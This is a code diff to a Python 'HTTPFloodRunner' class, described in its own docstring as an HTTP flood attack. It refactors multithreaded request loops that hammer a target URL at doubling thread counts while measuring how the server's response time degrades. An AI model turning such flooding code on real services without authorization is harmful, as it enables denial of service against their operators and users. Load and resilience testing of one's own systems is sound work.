@@ -68,20 +68,27 @@ class HTTPFloodRunner:
     def thread_func(self):
         ''' Thread function '''
 
-        while True:
+        num_requests = 0
+        status_code_count = {}
+
+        while not self.stop_threads:
             req = requests.get(self.url)
             status_code = req.status_code
 
-            with self.lock:
-                self.requests_count += 1
+            num_requests += 1
 
+            if status_code not in status_code_count:
+                status_code_count[status_code] = 1
+            else:
+                status_code_count[status_code] += 1
+
+        with self.lock:
+            self.requests_count += num_requests
+            for status_code, count in status_code_count.items():
                 if status_code not in self.status_code_count:
-                    self.status_code_count[status_code] = 1
+                    self.status_code_count[status_code] = count
                 else:
-                    self.status_code_count[status_code] += 1
-
-                if self.stop_threads:
-                    break
+                    self.status_code_count[status_code] += count
 
     def start(self, num_threads):
         ''' Start the http flood attack '''
@@ -100,8 +107,7 @@ class HTTPFloodRunner:
 
         print(f'Stopping {len(self.threads)} threads...')
 
-        with self.lock:
-            self.stop_threads = True
+        self.stop_threads = True
 
         for thread in self.threads:
             thread.join()
@@ -129,6 +135,7 @@ def main(argv):
 
     for i in range(int(math.log2(max_threads)) + 1):
         runner.start(2 ** i)
+        time.sleep(3)
         response_times[2 ** i] = checker.measure_average_response_time()
         runner.stop()
 
